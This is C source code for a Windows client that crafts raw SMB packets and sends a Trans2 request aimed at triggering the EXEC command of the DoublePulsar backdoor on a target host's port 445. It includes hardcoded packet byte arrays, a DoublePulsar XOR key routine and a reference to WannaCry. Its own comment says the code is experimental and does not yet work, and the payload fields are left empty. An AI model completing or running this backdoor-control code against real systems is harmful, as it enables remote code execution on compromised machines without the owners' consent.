#define _CRT_SECURE_NO_WARNINGS

/*
DoublePulsar EXEC command using a structure.
This currently does NOT work for me as of: August 12, 2020
This is still experimental!
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>
#include <stdint.h>
#pragma comment(lib, "wsock32.lib")

unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

unsigned char SMB_TreeConnectAndX[] =
"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";

unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";

unsigned char trans2_session_setup[] =
"\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
"\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01"
"\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00";

#pragma pack(1)
typedef struct {
	uint16_t SmbMessageType; //0x00
	uint16_t SmbMessageLength;
	uint8_t ProtocolHeader[4]; //"\xffSMB"
	uint8_t SmbCommand;
	uint32_t NtStatus; //0x00000000
	uint8_t flags = 0x18; //0x18 - pathnames not case sensitive & pathnames canonicalized
	uint16_t flags2;  //0xC007
	uint16_t ProcessIDHigh; //0x00
	uint8_t signature[8]; //0x00000000000
	uint16_t reserved; //0x0000
	uint16_t TreeId;                     //tree ID must be set
	uint16_t ProcessID; //0xfeff
	uint16_t UserID;
	uint16_t multipleID;                 //must have a multiplex ID

	//trans2 stuff
	uint8_t wordCount;              //setupcount(1) + wordcount (14)
	uint16_t totalParameterCount;
	uint16_t totalDataCount;
	uint16_t MaxParameterCount;
	uint16_t MaxDataCount;
	uint8_t MaxSetupCount;

	uint8_t reserved1;
	uint16_t flags1;
	uint32_t timeout;
	uint16_t reserved2;

	uint16_t ParameterCount;
	uint16_t ParamOffset;

	uint16_t DataCount;
	uint16_t DataOffset;
	uint8_t SetupCount;

	uint8_t reserved3;
	uint16_t subcommand; //0x0e00 also known as Subcommand in Wireshark
	uint16_t ByteCount; //4109 or 0x0d 0x10
	uint8_t padding;

	char SESSION_SETUP_PARAMETERS[12]; //Wannacry uses 12 as the size but need NULL terminator
} SMB_DOUBLEPULSAR_REQUEST;

#define SWAP_WORD(X) (((((uint32_t)(X)) >> 24) & 0x000000ff) | \
				((((uint32_t)(X)) >>  8) & 0x0000ff00) | \
							 ((((uint32_t)(X)) <<  8) & 0x00ff0000) | \
							 ((((uint32_t)(X)) << 24) & 0xff000000))

#define SWAP_SHORT(X) ( ((((uint16_t)X)& 0xff00) >> 8) | ((((uint16_t)X)& 0x00ff) << 8) )

unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
{
	unsigned int x = (2 * sig ^ (((sig & 0xff00 | (sig << 16)) << 8) | (((sig >> 16) | sig & 0xff0000) >> 8))) & 0xffffffff;
	return x;
}

void convert_name(char *out, char *name)
{
	unsigned long len;
	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}

unsigned char recvbuff[2048];
int main(int argc, char* argv[])
{
	
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET    sock;
	DWORD    ret;
	WORD    userid, treeid, processid, multiplexid;

	WSAStartup(MAKEWORD(2, 2), &ws);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0)
	{
		return 0;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons((USHORT)445);
	ret = connect(sock, (struct sockaddr*) & server, sizeof(server));

	//send SMB negociate packet
	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//send Session Setup AndX request
	printf("sending Session_Setup_AndX_Request!\n");
	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy our returned userID value from the previous packet to the TreeConnect request packet
	userid = *(WORD*)(recvbuff + 0x20);       //get userid

	//Generates a dynamic TreeConnect request with the correct IP address
	//rather than the hard coded one embedded in the TreeConnect string
	unsigned char packet[4096];
	unsigned char *ptr;
	unsigned char tmp[1024];
	unsigned short smblen;
	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
	ptr += sizeof(SMB_TreeConnectAndX) - 1;
	sprintf((char*)tmp, "\\\\%s\\IPC$",argv[1]);
	convert_name((char*)ptr, (char*)tmp);
	smblen = strlen((char*)tmp) * 2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX) - 1 - 3, &smblen, 1);
	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_) - 1);
	ptr += sizeof(SMB_TreeConnectAndX_) - 1;
	smblen = ptr - packet;
	smblen -= 4;
	memcpy(packet + 3, &smblen, 1);

	//update UserID in modified TreeConnect Request
	memcpy(packet + 0x20, (char*)&userid, 2); //update userid

	//send modified TreeConnect request
	send(sock, (char*)packet, ptr - packet, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid

	//set SMB values
	SMB_DOUBLEPULSAR_REQUEST uploadpacket;
	uploadpacket.SmbMessageType = 0x0000;
	uploadpacket.ProtocolHeader[0] = '\xff';
	uploadpacket.ProtocolHeader[1] = 'S';
	uploadpacket.ProtocolHeader[2] = 'M';
	uploadpacket.ProtocolHeader[3] = 'B';
	uploadpacket.SmbCommand = 0x32; //Trans2 
	uploadpacket.SmbMessageLength = SWAP_SHORT(0x104E); //4174
	uploadpacket.ProcessIDHigh = 0x0000;
	uploadpacket.NtStatus = 0x00000000;
	uploadpacket.flags = 0x18;
	uploadpacket.flags2 = 0xc007;
	uploadpacket.UserID = userid;
	uploadpacket.reserved = 0x0000;
	uploadpacket.ProcessID = 0xfeff; 
	uploadpacket.TreeId = treeid;			
	uploadpacket.multipleID = 0x42;

	//trans2 packet stuff
	uploadpacket.wordCount = 15; // 0x0F == 15 
	uploadpacket.totalParameterCount = 0x0C; // should be 12
	uploadpacket.totalDataCount = SWAP_SHORT(0x1000); // should be 4096

	uploadpacket.MaxParameterCount = SWAP_SHORT(0x0100); // should be 1
	uploadpacket.MaxDataCount = SWAP_SHORT(0x0000); // should be 0
	uploadpacket.MaxSetupCount = SWAP_SHORT(0);     //should be 0
	uploadpacket.reserved1 = SWAP_SHORT(0);
	uploadpacket.flags1 = 0x0000;

	//trying little endian format for timeout
	uploadpacket.timeout = SWAP_WORD(0x001a8925); //0x25 0x89 0x1a 0x00 EXEC command

	uploadpacket.reserved2 = SWAP_SHORT(0x0000);                 //should be 0x0000
	uploadpacket.ParameterCount = 0x0C;         //should be 12
	uploadpacket.ParamOffset= 0x0042;          //should be 66
	uploadpacket.DataCount = SWAP_SHORT(0x1000);          //should be 4096
	uploadpacket.DataOffset = 0x004e;           //should be 78
	uploadpacket.SetupCount = 1;						//should be 1 / 0x01
	uploadpacket.reserved3 = 0x00;						//should be 0x00
	uploadpacket.subcommand = 0x000e;         //original 0x0e00 ( little endian format )
	uploadpacket.ByteCount = 0x100D;          //value should be 4109
	uploadpacket.padding = SWAP_SHORT(0x00);			//should be 0x00
  
	uploadpacket.signature[0] = '\0';
	uploadpacket.signature[1] = '\0';
	uploadpacket.signature[2] = '\0';
	uploadpacket.signature[3] = '\0';
	uploadpacket.signature[4] = '\0';
	uploadpacket.signature[5] = '\0';
	uploadpacket.signature[6] = '\0';
	uploadpacket.signature[7] = '\0';

  //initialize to 0
	uploadpacket.SESSION_SETUP_PARAMETERS[0] = '\0';
	uploadpacket.SESSION_SETUP_PARAMETERS[1] = '\0';
	uploadpacket.SESSION_SETUP_PARAMETERS[2] = '\0';
	uploadpacket.SESSION_SETUP_PARAMETERS[3] = '\0';
	uploadpacket.SESSION_SETUP_PARAMETERS[4] = '\0';
	uploadpacket.SESSION_SETUP_PARAMETERS[5] = '\0';
	uploadpacket.SESSION_SETUP_PARAMETERS[6] = '\0';
	uploadpacket.SESSION_SETUP_PARAMETERS[7] = '\0';
	uploadpacket.SESSION_SETUP_PARAMETERS[8] = '\0';
	uploadpacket.SESSION_SETUP_PARAMETERS[9] = '\0';
	uploadpacket.SESSION_SETUP_PARAMETERS[10] = '\0';
	uploadpacket.SESSION_SETUP_PARAMETERS[11] = '\0';

	send(sock, (char*)&uploadpacket, sizeof(uploadpacket), 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	closesocket(sock);
	WSACleanup();
	return 0;
}
